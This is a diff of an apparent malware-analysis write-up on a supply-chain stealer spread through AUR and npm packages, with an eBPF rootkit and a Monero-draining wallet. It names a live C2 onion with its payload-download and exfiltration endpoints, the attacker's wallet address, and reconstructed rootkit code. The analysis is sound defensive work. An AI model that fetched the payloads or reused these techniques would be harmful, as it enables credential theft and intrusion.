@@ -42,13 +42,13 @@ The rebuilt `monero-wallet-gui` scans byte-identical to stock at the native laye
 | Payload location | 12 lines of QML injected into the zlib-compressed Qt resource bundle (`main.qml`) |
 | Impact | auto-sweep of any synced wallet > 1 XMR to `865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C`, no user dialog (MITRE T1657) |
 | C2 | Tor onion `olrh4mibs…onion`, `GET /api/mt/`, machine-id-derived Bearer |
-| Actor | same operator/codebase as IronWorm; lineage Shai-Hulud -> IronWorm -> Atomic Arch |
+| Actor | same operator/codebase as IronWorm. Lineage: Shai-Hulud -> IronWorm -> Atomic Arch |
 
 **Analytic confidence:**
 
 - <span class="badge-high">HIGH</span> the drainer logic and the destination address. Static proof: the injected QML, the documented `createTransactionAllAsync` sweep-all semantics, and a stock-wallet negative control. Caveat: live coin movement was **not** demonstrated. I scripted a funded private wallet in front of the trojan, but a Monero wallet regression ([#8600](https://github.com/monero-project/monero/issues/8600), hard fork v16 at height 1) keeps a regtest chain from ever crediting the balance, so the `> 1 XMR` sweep gate never trips. The runtime outcome is reasoned, not filmed.
 - <span class="badge-mod">MODERATE-HIGH</span> Atomic Arch and IronWorm are the same operator or codebase. The link is an operator-unique BIP-39 mnemonic: it is in this campaign's `deps` binary (verified here, derives to ETH `0x7e28d9889f414b06c19a22a9bd316f0ac279a4d6`) and matches the one [JFrog and SafeDep](https://safedep.io/ti/campaigns/ironworm/) published for IronWorm, plus corroborating TTPs. Not HIGH, because the IronWorm side rests on their reporting rather than my own diff, and a worm that hardcodes a seed can carry it into accounts it hijacks.
-- <span class="badge-low">LOW</span> that the GitHub account `fardewoak` maps to a specific human. It is a burner, and this campaign's stealer is *built* to take over developer accounts and republish under the victim's identity. I watched the first half happen (it validates stolen tokens and enumerates the victim's packages, captured live below); no public source shows the republish-as-victim half actually executed, and both observed waves came from fresh attacker accounts, not hijacked maintainers. Either way, an account-plus-artifact match is exactly the pattern that would frame an innocent victim, so I attribute the operating persona, not a named person.
+- <span class="badge-low">LOW</span> that the GitHub account `fardewoak` maps to a specific human. It is a burner, and this campaign's stealer is *built* to take over developer accounts and republish under the victim's identity. I watched the first half happen (it validates stolen tokens and enumerates the victim's packages, captured live below). No public source shows the republish-as-victim half actually executed, and both observed waves came from fresh attacker accounts, not hijacked maintainers. Either way, an account-plus-artifact match is exactly the pattern that would frame an innocent victim, so I attribute the operating persona, not a named person.
 
 ## how this started {#how-this-started}
 
@@ -87,7 +87,7 @@ Against the clean package the change is tiny, and that is the point. Upstream `h
 
 That is the entire AUR-side delta: one `install=` line and a scriptlet file. The same minimal change hit real, named packages, `guiscrcpy`, `alvr`, `netmon-git`, `keepassx2`, `inadyn-mt` among them, and a public example of the commit is `premake-git` `232b22dd` on the AUR (2026-06-09). Two honesty notes: that cgit diff is behind bot-protection as I write this, so I am citing it rather than re-quoting its body, and the `.install` I show below is the one I actually hold on disk. (Unrelated: `librewolf-fix-bin` and similar names float around in these discussions but belong to a separate 2025 ChaosRAT campaign, not this one.)
 
-Two things slide past a skim. `sha256sums=('SKIP')` means the build trusts whatever the source URL serves, no hash pin. And `install=` points at a *scriptlet* in a separate file that `makepkg` runs automatically as part of installation, after the package lands, with the building user's privileges. People read the `PKGBUILD` and stop, because that is the file the AUR shows you first; almost nobody opens the `.install`. That is exactly where the payload sits. The real captured `.install` (`pkgbuilds/htbrowser-bin-deps.install`) carried a `post_install()` that looked like this:
+Two things slide past a skim. `sha256sums=('SKIP')` means the build trusts whatever the source URL serves, no hash pin. And `install=` points at a *scriptlet* in a separate file that `makepkg` runs automatically as part of installation, after the package lands, with the building user's privileges. People read the `PKGBUILD` and stop, because that is the file the AUR shows you first. Almost nobody opens the `.install`. That is exactly where the payload sits. The real captured `.install` (`pkgbuilds/htbrowser-bin-deps.install`) carried a `post_install()` that looked like this:
 
 ```bash
 post_install() {
@@ -114,7 +114,7 @@ octal marker        \$'\\[1-7][0-7][0-7]
 empty-concat        [A-Za-z0-9]('')|('')[A-Za-z0-9]
 ```
 
-Run those signatures against the captured hook and they fire exactly where the decode table predicted. The real `.install` is heavier than the cleaned line above; every character of `cd`, `bun`, `add`, and both package names is split or escaped:
+Run those signatures against the captured hook and they fire exactly where the decode table predicted. The real `.install` is heavier than the cleaned line above. Every character of `cd`, `bun`, `add`, and both package names is split or escaped:
 
 ```
 $ cat htbrowser-bin-deps.install
@@ -197,7 +197,7 @@ $ curl -s -X POST https://mb-api.abuse.ch/api/v1/ -H "Auth-Key: $MB_KEY" \
   reporter   : "c0r3dump3d"
 ```
 
-The uploader named it `doNotDetonate`, which tells you the analyst who submitted it already knew what it was. I did not run the live `htbrowser-bin` chain to fetch the payload myself; the binary was already public, so I took the MalwareBazaar copy and hashed it, so the file every command below reads is exactly that upload:
+The uploader named it `doNotDetonate`, which tells you the analyst who submitted it already knew what it was. I did not run the live `htbrowser-bin` chain to fetch the payload myself. The binary was already public, so I took the MalwareBazaar copy and hashed it, so the file every command below reads is exactly that upload:
 
 ```
 $ sha256sum deps
@@ -219,7 +219,7 @@ $ python3 -c "import base64; print(base64.b64decode('YUTUM/igMWhph3tfg0yAElG7uTb
 6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b   # == the sample, recorded by the registry
 ```
 
-So the file is the same bytes three ways: the npm-shipped payload, the registry's recorded integrity hash, and the MalwareBazaar upload. The same holds on the other delivery path: `js-digest`'s `preinstall` at `lib/install-deps.mjs` is also an ELF, not a script, hashing to `7883bda1` (my wave-2 sample, BuildID `a687aed5…`). The campaign spreads one stealer family across several sockpuppet packages, so the AUR package and the npm package are just two ends of the same drop: `atomic-lockfile` ships the wave-1 build (`6144d433`), `js-digest` ships the wave-2 build (`7883bda1`), and `htbrowser-bin`'s hook names a third sibling, `nextfile-js`, on the same bun path as `js-digest`. Two of the three are byte-matched to my samples here; all carry the same stealer (byte-identical embedded eBPF object `3607de25…`, same onion, proven in the eBPF and C2 sections below).
+So the file is the same bytes three ways: the npm-shipped payload, the registry's recorded integrity hash, and the MalwareBazaar upload. The same holds on the other delivery path: `js-digest`'s `preinstall` at `lib/install-deps.mjs` is also an ELF, not a script, hashing to `7883bda1` (my wave-2 sample, BuildID `a687aed5…`). The campaign spreads one stealer family across several sockpuppet packages, so the AUR package and the npm package are just two ends of the same drop: `atomic-lockfile` ships the wave-1 build (`6144d433`), `js-digest` ships the wave-2 build (`7883bda1`), and `htbrowser-bin`'s hook names a third sibling, `nextfile-js`, on the same bun path as `js-digest`. Two of the three are byte-matched to my samples here. All carry the same stealer (byte-identical embedded eBPF object `3607de25…`, same onion, proven in the eBPF and C2 sections below).
 
 The rest of this analysis runs on the MalwareBazaar copy. The second stage is a different story: it is not on MalwareBazaar, VirusTotal, or Triage. It lives only behind the C2 onion, so I pulled that one from the live hidden service over Tor (more on that below).
 
@@ -345,7 +345,7 @@ Reading those off the binary:
   0
   ```
 
-  So the stealer tags Anthropic's Claude (`claude:`) and OpenAI's Codex (`codex:`) credentials as their own loot types. The generic `openai`/`chatgpt` strings are absent, and the one `sk-` hit is a false positive (it is the substring inside the flag `--ask-password`, a`sk-`password), so OpenAI is targeted here through its Codex CLI, not the raw API name. The likely source is the `/proc/*/environ` sweep reading `ANTHROPIC_API_KEY` / `OPENAI_API_KEY` and the two agents' config directories, the same mechanism it uses for other env-borne secrets. I am describing only what is in these two samples; a different build could differ.
+  So the stealer tags Anthropic's Claude (`claude:`) and OpenAI's Codex (`codex:`) credentials as their own loot types. The generic `openai`/`chatgpt` strings are absent, and the one `sk-` hit is a false positive (it is the substring inside the flag `--ask-password`, a`sk-`password), so OpenAI is targeted here through its Codex CLI, not the raw API name. The likely source is the `/proc/*/environ` sweep reading `ANTHROPIC_API_KEY` / `OPENAI_API_KEY` and the two agents' config directories, the same mechanism it uses for other env-borne secrets. I am describing only what is in these two samples. A different build could differ.
 - **Wallets.** `/usr/bin/monero-wallet-gui` and `/opt/exodus` are both named explicitly, but the decompiled wallet routine (`fcn.001287f0`) treats them differently. `/opt/exodus` is only a presence check, it tests whether the directory exists and records the result, with no Exodus seed or vault file actually read. `monero-wallet-gui` is the one it acts on: that path is what the stager overwrites, the second-stage target. So this is wallet targeting, not Exodus wallet theft.
 
 I got the mechanism wrong here at first, so it is worth correcting. My early notes had the stealer decrypting Chromium cookies locally with an AES routine. It does not. There is no `saltysalt`, no `peanuts` keyring constant, no PBKDF2, no AES-CBC anywhere in it. The `AES_256_GCM` strings that sent me that way are rustls TLS cipher-suite names, not a cookie decryptor. What it actually does is simpler: it lifts the encrypted cookie databases whole and ships them, and decryption happens later, on the operator's side. Right artifact, wrong mechanism, and what caught it was reading those AES strings against a benign control instead of taking them at face value.
@@ -380,7 +380,7 @@ libsecret      deps=0 js=0
 kwallet        deps=0 js=0
 ```
 
-The only non-zero anywhere was the three-character token `v20` under the XOR sweeps, which is statistical noise: a three-byte string matches by chance dozens of times across the swept bytes, and it scored zero contiguous, so it is not actually present. The first-principles close is what makes this conclusive rather than suggestive. Linux Chromium `v10`/`v11` cookies decrypt with AES-128-CBC keyed by PBKDF2-SHA1 over the literal string `saltysalt`. With `saltysalt` and `pbkdf2` provably absent under every lens, and the only `AES_128_CBC` in the binary being rustls cipher-suite names (`aes_128_cbc` lowercase appears zero times; the uppercase form is four substrings, `TLS_ECDHE_{RSA,ECDSA}_WITH_AES_128_CBC_SHA` and the two `_SHA256` variants, all packed into one `.rodata` line, so `grep -c` returns `1` and `grep -o | wc -l` returns `4`), local decryption is not merely unevidenced, it is impossible for this code. The same battery puts OpenAI and ChatGPT, and every other AI-vendor host I tested (Anthropic, Google, Hugging Face, Mistral, Cohere, and the rest), at zero in both binaries, which is why I keep the AI-credential claim to what is actually there: the `codex:` and `claude:` loot labels and the generic environment-and-history sweep that scoops up an `OPENAI_API_KEY` or `ANTHROPIC_API_KEY` with no vendor string wired into the binary at all.
+The only non-zero anywhere was the three-character token `v20` under the XOR sweeps, which is statistical noise: a three-byte string matches by chance dozens of times across the swept bytes, and it scored zero contiguous, so it is not actually present. The first-principles close is what makes this conclusive rather than suggestive. Linux Chromium `v10`/`v11` cookies decrypt with AES-128-CBC keyed by PBKDF2-SHA1 over the literal string `saltysalt`. With `saltysalt` and `pbkdf2` provably absent under every lens, and the only `AES_128_CBC` in the binary being rustls cipher-suite names (`aes_128_cbc` lowercase appears zero times, and the uppercase form is four substrings, `TLS_ECDHE_{RSA,ECDSA}_WITH_AES_128_CBC_SHA` and the two `_SHA256` variants, all packed into one `.rodata` line, so `grep -c` returns `1` and `grep -o | wc -l` returns `4`), local decryption is not merely unevidenced, it is impossible for this code. The same battery puts OpenAI and ChatGPT, and every other AI-vendor host I tested (Anthropic, Google, Hugging Face, Mistral, Cohere, and the rest), at zero in both binaries, which is why I keep the AI-credential claim to what is actually there: the `codex:` and `claude:` loot labels and the generic environment-and-history sweep that scoops up an `OPENAI_API_KEY` or `ANTHROPIC_API_KEY` with no vendor string wired into the binary at all.
 
 This differs from [Whanos](https://github.com/Whanos)'s wave-1 report, which lists OpenAI/ChatGPT token theft. In the two binaries I hold, `api.openai.com`, `openai`, and `chatgpt` are byte-absent, and the AI targets show up instead as the `codex:` and `claude:` loot labels above. The most likely explanation is a different build, or a target string assembled at runtime. I describe what is in these two samples, not the build they reversed.
 
@@ -399,7 +399,7 @@ GET /-/whoami HTTP/1.1
 PGET /user/repos?sort=stars&direction=desc&per_page=3&type=owner HTTP/1.1
 ```
 
-The leading `#` and `P` are spillover bytes from the preceding `.rodata` literal (the same artifact as the GPG argline's `9 ` prefix later), and `strings` stops each line at the `\r\n`, so the `Host:` values and the username are separate strings filled in at request time. The `maintainer%3A` (`maintainer:`) template ends exactly where the username goes. The `Authorization: Bearer` token is not in the binary; it is read from the victim's `gh/hosts.yml` and `.npmrc` at runtime and pasted into the header. The full GitHub template also sets two headers built to blend in, `User-Agent: git/2.39.0` and `Accept: application/vnd.github+json`. There is no git library in the binary that would emit that user-agent on its own, so the `git/2.39.0` is a deliberate masquerade: the token-validation traffic reads on the wire like an ordinary `git` fetch over HTTPS rather than a scraper hammering the API.
+The leading `#` and `P` are spillover bytes from the preceding `.rodata` literal (the same artifact as the GPG argline's `9 ` prefix later), and `strings` stops each line at the `\r\n`, so the `Host:` values and the username are separate strings filled in at request time. The `maintainer%3A` (`maintainer:`) template ends exactly where the username goes. The `Authorization: Bearer` token is not in the binary. It is read from the victim's `gh/hosts.yml` and `.npmrc` at runtime and pasted into the header. The full GitHub template also sets two headers built to blend in, `User-Agent: git/2.39.0` and `Accept: application/vnd.github+json`. There is no git library in the binary that would emit that user-agent on its own, so the `git/2.39.0` is a deliberate masquerade: the token-validation traffic reads on the wire like an ordinary `git` fetch over HTTPS rather than a scraper hammering the API.
 
 ```
 $ strings deps | grep -cF 'git/2.39.0'      # the spoofed UA, present
@@ -416,7 +416,7 @@ One honesty note, because it changes how alarmed you should be. I observed the r
 
 These are not reconstructed from the binary. They are the requests themselves, read in cleartext at a transparent TLS interception point. I redirect the guest's egress to a local sink that, for each connection, peeks the SNI out of the ClientHello and presents a leaf certificate minted on the fly for that exact host.
 
-Why the stealer accepts that leaf is worth getting right, because the obvious guess, that it trusts a CA I planted in the system store, is not what happens. The TLS stack is `rustls` over `ring`, and the stealer ships a no-op certificate verifier. The binary carries a `NoCertVerifier` type and, tellingly, not one of the strings a verifying client needs: no `rustls-native-certs`, no `webpki`, no `ca-certificates.crt`, no `SSL_CERT_FILE`. So it negotiates TLS for confidentiality and to look ordinary on the wire, then accepts whatever certificate it is handed without authenticating it. A sinkhole presenting a self-signed leaf decrypts cleanly because the malware never checks. I do still install a throwaway CA in the guest, but that is for the clients that actually verify (the Node proxy, `curl`); the Rust stealer does not need it.
+Why the stealer accepts that leaf is worth getting right, because the obvious guess, that it trusts a CA I planted in the system store, is not what happens. The TLS stack is `rustls` over `ring`, and the stealer ships a no-op certificate verifier. The binary carries a `NoCertVerifier` type and, tellingly, not one of the strings a verifying client needs: no `rustls-native-certs`, no `webpki`, no `ca-certificates.crt`, no `SSL_CERT_FILE`. So it negotiates TLS for confidentiality and to look ordinary on the wire, then accepts whatever certificate it is handed without authenticating it. A sinkhole presenting a self-signed leaf decrypts cleanly because the malware never checks. I do still install a throwaway CA in the guest, but that is for the clients that actually verify (the Node proxy, `curl`). The Rust stealer does not need it.
 
 ```
 $ strings deps | grep -cF NoCertVerifier        # custom no-op cert verifier: present
@@ -436,7 +436,7 @@ openssl x509 -req -in "$sni.csr" -CA ca.crt -CAkey ca.key -days 2 \
 # wrap the socket with $sni.crt and read the cleartext request. the stealer does not verify, so any leaf works.
 ```
 
-One honesty note on that mechanism, because it is an inference from the binary and not yet a control. The clean test is to re-fire the sink with no CA installed anywhere: the `NoCertVerifier` reading predicts the stealer still decrypts, since it never validated, where a client that did verify would drop the connection with a TLS alert. The static evidence (a `NoCertVerifier` type, zero root-store or `webpki` strings) already points one way; that one no-CA run is what would close it, and I am flagging it as a control I have not run rather than dressing the inference up as proven.
+One honesty note on that mechanism, because it is an inference from the binary and not yet a control. The clean test is to re-fire the sink with no CA installed anywhere: the `NoCertVerifier` reading predicts the stealer still decrypts, since it never validated, where a client that did verify would drop the connection with a TLS alert. The static evidence (a `NoCertVerifier` type, zero root-store or `webpki` strings) already points one way. That one no-CA run is what would close it, and I am flagging it as a control I have not run rather than dressing the inference up as proven.
 
 The home directory it harvested was seeded with canary tokens (`gho_HONEYCANARY…`, `npm_HONEYCANARY…`) that it used without ever knowing they were fake. Here is the actual `c2_capture.log` from `vmtest_1781526796`, lightly trimmed:
 
@@ -515,7 +515,7 @@ The obfuscation is concentrated precisely on the process-execution surface, the 
 
 Everything to this point runs as your user, and so does the stealer itself. The next component is different: it only arms with root, so it is the escalation payoff rather than the baseline. When it does get privileges, it stops asking the kernel questions and starts editing the kernel's answers. The `aya`/`libbpf` crates were not decoration. The annotated BPF-C source survives in the binary strings, at the build path `/cloud/scales/agent/../ebpf/scales.bpf.c`. Hold onto that `/cloud/` prefix, it comes back later. This is a kernel-resident rootkit and traffic sniffer, and it is the reason static-only analysis is the safe way to handle this sample.
 
-Two things to pin down first, because eBPF trips people up and this campaign has two separate binaries that are easy to confuse. What eBPF is: a Linux kernel feature that lets you load small, sandboxed programs into the kernel to run on events like syscalls or network packets. It is meant for tracing and observability, the same machinery behind tools like `bpftrace` and Cilium, but because those programs run inside the kernel and sit directly on the syscall path, a hostile one can change what userspace is allowed to see. That is the whole difference from a classic rootkit: it does not patch your files or swap out your `ls`, it edits the kernel's answers on the way out to userspace. And which binary carries it: the rootkit is inside the **stage-one `deps` stealer**, the Rust binary the AUR and npm chain drops and runs first. It is **not** in the second-stage `monero-wallet-gui` the stealer later pulls from the Tor C2; that one is the wallet drainer, and its malice lives in QML. One binary (the stealer) carries the rootkit, a different binary (the wallet it fetches) carries the drainer.
+Two things to pin down first, because eBPF trips people up and this campaign has two separate binaries that are easy to confuse. What eBPF is: a Linux kernel feature that lets you load small, sandboxed programs into the kernel to run on events like syscalls or network packets. It is meant for tracing and observability, the same machinery behind tools like `bpftrace` and Cilium, but because those programs run inside the kernel and sit directly on the syscall path, a hostile one can change what userspace is allowed to see. That is the whole difference from a classic rootkit: it does not patch your files or swap out your `ls`, it edits the kernel's answers on the way out to userspace. And which binary carries it: the rootkit is inside the **stage-one `deps` stealer**, the Rust binary the AUR and npm chain drops and runs first. It is **not** in the second-stage `monero-wallet-gui` the stealer later pulls from the Tor C2. That one is the wallet drainer, and its malice lives in QML. One binary (the stealer) carries the rootkit, a different binary (the wallet it fetches) carries the drainer.
 
 The stealer carries the compiled BPF object as an embedded blob, at file offset `0x324f9` in `deps` and `0x37d91` in `js-digest`, byte-identical between them, and absent entirely from the second-stage wallet. Pulled out and inspected on its own, it is a normal eBPF relocatable, built with debug info, which is exactly why the source reconstructs so cleanly:
 
@@ -600,7 +600,7 @@ if (pid_hidden(target))
     bpf_send_signal(9);              /* SIGKILL the tracer, in-kernel */
 ```
 
-That C is a reconstruction from the debug info. The compiled bytecode it came from says the same thing with no room to argue, the request check, the hide-list lookup, then the kill (llvm-objdump's leading instruction offsets and opcode bytes are trimmed for width and the `;` notes are mine; the instruction text is verbatim):
+That C is a reconstruction from the debug info. The compiled bytecode it came from says the same thing with no room to argue, the request check, the hide-list lookup, then the kill (llvm-objdump's leading instruction offsets and opcode bytes are trimmed for width and the `;` notes are mine, the instruction text is verbatim):
 
 ```
 $ llvm-objdump -d --section='tp/syscalls/sys_enter_ptrace' ebpf_rootkit.o
@@ -675,7 +675,7 @@ sock_open_temp
 
 So: 13 tracepoint programs, a `.maps` section, BTF and BTF.ext (the debug info that let the source reconstruct), and the `license` declaration. The pinned maps are `hidden_pids`, `hidden_names`, `hidden_inodes` (the hide lists), plus the scratch maps `recvmsg_temp`, `net_open_temp`, `net_fds`, `net_read_temp`, `sock_open_temp`, `diag_fds` that drive the connection-hiding state machine.
 
-The mechanics are not only in the recovered source, they show up in the helper-call profile of the compiled programs. I walked the bytecode and counted every `call` (opcode `0x85`) across all fourteen code sections: seventy in all, and an independent disassembler agrees. Sixty-nine are kernel-helper calls (`src=0`) and one is a bpf-to-bpf call (`src=1`); the histogram of the helper calls reads as the rootkit's own behavior, one helper per job:
+The mechanics are not only in the recovered source, they show up in the helper-call profile of the compiled programs. I walked the bytecode and counted every `call` (opcode `0x85`) across all fourteen code sections: seventy in all, and an independent disassembler agrees. Sixty-nine are kernel-helper calls (`src=0`) and one is a bpf-to-bpf call (`src=1`). The histogram of the helper calls reads as the rootkit's own behavior, one helper per job:
 
 ```
 $ python3 bpf_helpers.py ebpf_rootkit.o
@@ -691,7 +691,7 @@ $ python3 bpf_helpers.py ebpf_rootkit.o
                                          69 helper calls, 9 distinct helpers (+1 bpf-to-bpf)
 ```
 
-That column is the whole implant. The `probe_read_user` / `probe_write_user` pair is the read-the-kernel's-answer-then-overwrite-it pattern behind the dirent splicing and the `/proc/net/tcp` scrub; the lone `bpf_send_signal` is the single anti-debug kill; the four `bpf_loop`s are the bounded netlink and buffer walks.
+That column is the whole implant. The `probe_read_user` / `probe_write_user` pair is the read-the-kernel's-answer-then-overwrite-it pattern behind the dirent splicing and the `/proc/net/tcp` scrub. The lone `bpf_send_signal` is the single anti-debug kill. The four `bpf_loop`s are the bounded netlink and buffer walks.
 
 The "nothing reaches the network or writes a file" half is a negative control, not an adjective. Those nine are the *entire* call set across all fourteen code sections, and the exfil-capable helpers a data-stealing eBPF program would actually need are absent. Walk every `call` opcode and check for them:
 
@@ -707,7 +707,7 @@ absent (the egress / persistence helpers a stealer would need):
 verdict: intercept-and-rewrite only; no helper that can send, craft, or persist data
 ```
 
-So the rootkit physically cannot phone home or drop a file: it carries no helper that can. The exfil lives entirely in the userland Rust stealer; the kernel implant just keeps that traffic invisible. It is a pure intercept-and-rewrite implant, which is also why it leaves so little for userspace tooling to find.
+So the rootkit physically cannot phone home or drop a file: it carries no helper that can. The exfil lives entirely in the userland Rust stealer. The kernel implant just keeps that traffic invisible. It is a pure intercept-and-rewrite implant, which is also why it leaves so little for userspace tooling to find.
 
 ## the onion C2 {#the-onion}
 
@@ -746,7 +746,7 @@ plain: olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion
 
 Decode the other stealer with its own key and you land on the identical onion.
 
-The decode loop itself is right there in `.text`, and disassembling it shows the same `ct[i] ^ key[i % 32]` byte by byte, pushing each decoded character into the onion string buffer (the `<-` notes are mine; everything left of them is `objdump`'s output):
+The decode loop itself is right there in `.text`, and disassembling it shows the same `ct[i] ^ key[i % 32]` byte by byte, pushing each decoded character into the onion string buffer (the `<-` notes are mine, everything left of them is `objdump`'s output):
 
 ```
 $ objdump -d -M intel --start-address=0x1209f2 --stop-address=0x120a0d deps | grep -E '^ +[0-9a-f]+:' | sed -E 's/\t+/  /g; s/ +<[^>]+>//'
@@ -765,7 +765,7 @@ The single `xor cl, byte [rax]` at `0x1209fe` is the entire cipher. A byte from 
 
 Both scripts are in this post's repo. [`xor_onion.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/xor_onion.py) reads the two byte ranges at the known offsets and XORs them to print the onion. [`recover_onion.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/recover_onion.py) is the broader version: it sweeps the whole binary for a repeating-key XOR of a base32 `.onion` string against a 32-byte keystream, so it finds the construction even when you do not have the offsets in front of you yet. Point either one at `deps` or `js-digest` and the same onion falls out. Both are read-only, neither executes the sample.
 
-The C2 protocol, once you can read it: `GET /api/mt/` for tasking, with a Bearer token derived from `/etc/machine-id`. `GET /bin/sha256/linux` and `GET /bin/linux` to fetch the second stage. `POST /upload` for exfil, as a `multipart/form-data` body with the loot under `name="file"`. One correction to my own early notes: the tasking path is `/api/mt/`, not the `/api/agent` I first wrote. `/api/agent` is byte-level absent from every artifact; `/api/mt/` appears three times in each ELF. A byte-level negative control caught the mis-id.
+The C2 protocol, once you can read it: `GET /api/mt/` for tasking, with a Bearer token derived from `/etc/machine-id`. `GET /bin/sha256/linux` and `GET /bin/linux` to fetch the second stage. `POST /upload` for exfil, as a `multipart/form-data` body with the loot under `name="file"`. One correction to my own early notes: the tasking path is `/api/mt/`, not the `/api/agent` I first wrote. `/api/agent` is byte-level absent from every artifact. `/api/mt/` appears three times in each ELF. A byte-level negative control caught the mis-id.
 
 That tasking auth I read off the strings, not off the wire. The binary reads `/etc/machine-id` with a `no machine-id` fallback, so the read sits on a live path, and it carries an `Authorization: Bearer` template:
 
@@ -804,7 +804,7 @@ $ strings -t x deps | grep -E '/usr/bin/monero-wallet-gui|write tmp:|rename: |re
   40f85 /usr/bin/monero-wallet-guiserver returned empty binarytmp 200 headers too large
 ```
 
-Two things to read here. The wallet path is the first 26 bytes of a packed slice at `0x40f85` (the Rust compiler concatenated adjacent literals into `/usr/bin/monero-wallet-gui` + `server returned empty binary` + `tmp 200` + `headers too large`; the code indexes the 26-byte prefix). Each verb literal carries a one-byte length prefix, which is why `strings` prints `replace:` with a leading tab (`\t` = length 9) and reports the others one byte past their non-printable prefix. The verbs `write tmp: -> rename: -> replace:` (plus the `download hash mismatch` guard) are the stage log of an atomic file swap. Disassembling the stager function at `0x1020ae` with `objdump` and reading its string-reference sites in address order lays out the whole sequence (the `# <offset>` comments are `objdump`'s; the `<-` notes are mine, and the offsets are the same `.rodata` literals from the table above):
+Two things to read here. The wallet path is the first 26 bytes of a packed slice at `0x40f85` (the Rust compiler concatenated adjacent literals into `/usr/bin/monero-wallet-gui` + `server returned empty binary` + `tmp 200` + `headers too large`, and the code indexes the 26-byte prefix). Each verb literal carries a one-byte length prefix, which is why `strings` prints `replace:` with a leading tab (`\t` = length 9) and reports the others one byte past their non-printable prefix. The verbs `write tmp: -> rename: -> replace:` (plus the `download hash mismatch` guard) are the stage log of an atomic file swap. Disassembling the stager function at `0x1020ae` with `objdump` and reading its string-reference sites in address order lays out the whole sequence (the `# <offset>` comments are `objdump`'s, the `<-` notes are mine, and the offsets are the same `.rodata` literals from the table above):
 
 ```
 $ objdump -d -M intel --start-address=0x1020ae --stop-address=0x102a40 deps \
@@ -871,7 +871,7 @@ $ for p in / /api/mt/ /api/ /upload /bin/ /bin/sha256/linux \
 /server-status         200 0
 ```
 
-Every path is `200 0`. There is no Server header, no `/server-status`, no `.git`, no `.env`, no source leak, no stack trace. A real endpoint and a garbage endpoint are indistinguishable to an unauthenticated client, which is the point: the server only serves real content to a victim beacon presenting a valid `/etc/machine-id`-derived Bearer. `/api/agent` returning `200 0` is exactly why I could not tell from probing alone that it was the wrong path; only the byte-level binary search settled that `/api/mt/` is real and `/api/agent` is not.
+Every path is `200 0`. There is no Server header, no `/server-status`, no `.git`, no `.env`, no source leak, no stack trace. A real endpoint and a garbage endpoint are indistinguishable to an unauthenticated client, which is the point: the server only serves real content to a victim beacon presenting a valid `/etc/machine-id`-derived Bearer. `/api/agent` returning `200 0` is exactly why I could not tell from probing alone that it was the wrong path. Only the byte-level binary search settled that `/api/mt/` is real and `/api/agent` is not.
 
 The two paths that do return content are the payload endpoints, and the content is auth-free because that is how the dropper fetches the second stage. A complete fetch of `/bin/linux`, with the length verified against the `Content-Length` so I would not get fooled by a truncated transfer again:
 
@@ -911,7 +911,7 @@ createTransactionAllAsync   : 2 call sites
 commitTransactionAsync      : True (silent auto-broadcast)
 ```
 
-The bytes the onion handed me this session decompress to the same `main.qml`, the same `865BH8` sweep address, the same two `createTransactionAllAsync` sites (the injected sweep plus the stock user-send), and the same silent `commitTransactionAsync` auto-broadcast. The channel is live and it is still serving the drainer, not a patched-clean wallet. Anyone who installed during the poisoning window pulled this exact payload, and the C2 was still handing it out while I was writing this. I saved the fetched copy as `live_47893d9badc38c54_27787328.bin`; it is byte-identical to the v1 on my disk.
+The bytes the onion handed me this session decompress to the same `main.qml`, the same `865BH8` sweep address, the same two `createTransactionAllAsync` sites (the injected sweep plus the stock user-send), and the same silent `commitTransactionAsync` auto-broadcast. The channel is live and it is still serving the drainer, not a patched-clean wallet. Anyone who installed during the poisoning window pulled this exact payload, and the C2 was still handing it out while I was writing this. I saved the fetched copy as `live_47893d9badc38c54_27787328.bin`. It is byte-identical to the v1 on my disk.
 
 `/api/mt/` is the tasking channel. Decompiling the routine that issues it (`deps_tasking_mt.c`, `fcn.00156031`) shows it expects a JSON object back and parses these `.rodata` field names out of it: `jwt`, `keys`, `secret`, `passphrase`, `kv`, `channels`, `package`, `version`, `url`, `file`, `name`, `value`, `metadata`, `items`, `message`, `role`. I get an empty body because I am not a registered victim. `POST /upload` is the exfil sink, and the request is hand-built from `.rodata` templates like everything else: a `multipart/form-data` body with one part, `Content-Disposition: form-data; name="file"; filename="…"` carrying `Content-Type: application/octet-stream`. On the wave-1 stealer the hardcoded host is `temp.sh` (a one-time file-share), with the upload metadata relayed back through the onion. The wave-2 build strips `temp.sh` and uploads to a runtime-supplied host instead. Both request templates sit in `.rodata` in the clear:
 
@@ -926,7 +926,7 @@ $ strings -t x deps | grep -E 'POST /upload HTTP|multipart/form-data; boundary|a
   2aeee GET /api/mt/
 ```
 
-The three `GET /api/mt/` copies are the tasking template reused at three call sites; the `POST /upload` multipart body is the one-part `name="file"` exfil envelope, octet-stream, no encryption layer of its own.
+The three `GET /api/mt/` copies are the tasking template reused at three call sites. The `POST /upload` multipart body is the one-part `name="file"` exfil envelope, octet-stream, no encryption layer of its own.
 
 That exfil change is one piece of a broader retarget. The two stealers carry the same rootkit object byte-for-byte, but `js-digest` (wave 2) is not just a rebuild of `deps` (wave 1), it is trimmed and re-aimed at the harvest layer. Measured against wave 1, wave 2 drops the Discord token grabber (thirteen clients in wave 1, zero in wave 2), drops the explicit `monero-wallet-gui` and `/opt/exodus` wallet targeting, drops the `machine-id` read, and adds the GPG keyring enumeration shown earlier:
 
@@ -996,7 +996,7 @@ $ grep -E 'connect|ENETUNREACH' ftrace.txt | head
   ← worker hidden from ps as: kworker/R-kmpat-2358   (kernel-thread name spoof)
 ```
 
